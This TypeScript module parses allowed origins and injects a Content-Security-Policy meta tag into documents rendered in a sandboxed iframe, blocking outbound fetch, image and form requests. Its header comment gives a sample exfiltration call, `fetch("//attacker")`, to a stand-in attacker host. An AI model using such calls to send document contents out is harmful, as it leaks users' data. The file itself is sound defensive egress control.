// Opt-in egress lockdown for rendered documents.
//
// Documents run in a `sandbox="allow-scripts"` iframe (opaque origin), so they
// can't read cookies or escape to the first-party origin. They *can* still
// phone home — `fetch("//attacker")`, `new Image().src = ...`, form posts — and
// exfiltrate whatever the document holds. There is no HTTP header path for this:
// the shell renders documents via `iframe.srcdoc`, which only honors a CSP from
// a `<meta http-equiv>` inside the document. So when the operator opts in, we
// inject that meta tag at serve time.
//
// This is a best-effort egress control, not a guarantee: it shuts the obvious
// channels (connect/img/form) but not covert ones (timing, etc.).

export function parseAllowedOrigins(raw: string): string[] {
  return raw
    .split(/[\s,]+/)
    .map((origin) => origin.trim())
    .filter((origin) => origin.length > 0 && origin.toLowerCase() !== "none");
}

export function buildDocCsp(allowedOrigins: string[]): string {
  const origins = allowedOrigins.join(" ");
  const withOrigins = (directive: string): string => (origins ? `${directive} ${origins}` : directive);
  return [
    "default-src 'none'",
    withOrigins("script-src 'unsafe-inline' 'unsafe-eval'"),
    withOrigins("style-src 'unsafe-inline'"),
    withOrigins("img-src data: blob:"),
    withOrigins("font-src data:"),
    withOrigins("media-src data: blob:"),
    origins ? `connect-src ${origins}` : "connect-src 'none'",
    "form-action 'none'",
    "frame-src 'none'",
    "base-uri 'none'",
  ].join("; ");
}

// Returns the CSP string to inject, or null when the feature is disabled
// (env var unset or empty). A value of "none" enables it with zero allowed
// origins — full lockdown.
export function docCspFromEnv(raw: string | undefined): string | null {
  if (!raw || raw.trim().length === 0) return null;
  return buildDocCsp(parseAllowedOrigins(raw));
}

export function injectDocCsp(html: string, csp: string): string {
  const meta = `<meta http-equiv="Content-Security-Policy" content="${csp}">`;
  const head = html.match(/<head[^>]*>/i);
  if (head) return html.replace(head[0], `${head[0]}${meta}`);
  const htmlTag = html.match(/<html[^>]*>/i);
  if (htmlTag) return html.replace(htmlTag[0], `${htmlTag[0]}<head>${meta}</head>`);
  // ponytail: no <head>/<html> — a leading meta lands in the parser's implied head
  return `${meta}${html}`;
}
